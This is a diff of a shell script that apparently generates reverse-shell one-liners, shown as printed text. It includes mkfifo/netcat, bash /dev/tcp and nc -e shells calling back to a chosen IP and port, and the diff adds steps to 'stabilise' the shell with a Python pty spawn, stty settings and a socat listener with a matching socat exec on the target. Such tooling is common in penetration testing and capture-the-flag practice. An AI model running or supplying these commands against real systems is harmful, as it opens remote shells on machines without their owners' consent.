@@ -26,7 +26,7 @@ case "$TYPE" in
         echo -e "${CYAN}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f${NC}"
         ;;
     "bash")
-        echo -e "${CYAN}bash -c '/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1'${NC}"
+        echo -e "${CYAN}bash -c \"/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1\"${NC}"
         ;;
     "nc")
         echo -e "${CYAN}nc $IP $PORT -e /bin/bash${NC}"
@@ -39,3 +39,24 @@ case "$TYPE" in
         exit 1
         ;;
 esac
+
+echo -e "\n${GREEN}Stablize The Shell :${NC}"
+
+echo -e "
+${RED}With Python :${NC}
+
+${YELLOW}python3 -c \"import pty; pty.spawn('/bin/bash')\"
+Ctrl+Z ==> Enter
+stty raw -echo;fg
+export TERM=xterm
+stty rows 200 columns 200${NC}"
+
+echo -e "
+${RED}With Socat :${NC}
+
+${MAGENTA}on our local machine we run :${NC}
+${YELLOW}socat file:`tty`,raw,echo=0 tcp-listen:5555${NC}
+
+${MAGENTA}and we run on the target :${NC}
+${YELLOW}./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:5555${NC}
+"
